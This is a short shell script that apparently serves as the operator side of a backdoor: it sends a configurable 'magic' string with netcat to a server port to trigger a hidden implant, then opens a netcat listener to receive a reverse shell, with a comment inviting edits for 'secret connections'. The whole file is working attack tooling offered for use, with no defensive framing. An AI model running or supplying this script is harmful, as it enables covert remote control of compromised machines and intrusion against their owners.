#!/bin/sh

MAGIC="change this magic string"
SERVER_HOST="localhost"
SERVER_MAGIC_PORT=8080
REVERSE_SHELL_LOCAL_PORT=8080

echo "Sending magic packet to $SERVER_HOST:$SERVER_MAGIC_PORT"

# You can edit the nc command, and impliment logic for successful secret connections.
echo $MAGIC | netcat -c -vvv $SERVER_HOST $SERVER_MAGIC_PORT && echo "Success" && echo "Starting reverse shell..." && netcat -nvlp $REVERSE_SHELL_LOCAL_PORT && echo "Exited reverse shell" && exit 0

echo "Failed to connect to the host."
exit 1